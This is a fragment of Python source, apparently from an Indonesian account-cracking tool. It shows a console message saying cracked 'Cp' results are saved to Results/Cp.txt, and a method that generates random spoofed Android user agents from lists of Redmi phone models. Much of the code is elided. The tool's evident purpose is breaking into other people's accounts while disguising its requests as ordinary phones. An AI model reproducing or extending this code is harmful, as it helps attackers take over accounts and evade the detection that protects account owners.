...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_version = random.choice(['11','10','9','8.1.0','12','7.0.0','6.0.0','5.0.0','12'])
            self.android_model = random.choice(['Redmi 10 2022','Redmi Note 6','Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9','Redmi Note 10','Redmi Note 10s','Redmi Note 10 Pro','MI A3','Redmi 4','Redmi 5','Redmi 5A','Redmi 6','Redmi 6A','Redmi 7','Redmi 8','Redmi 9','Redmi 9A','Redmi 9C','Redmi 10C','Redmi 10A'])
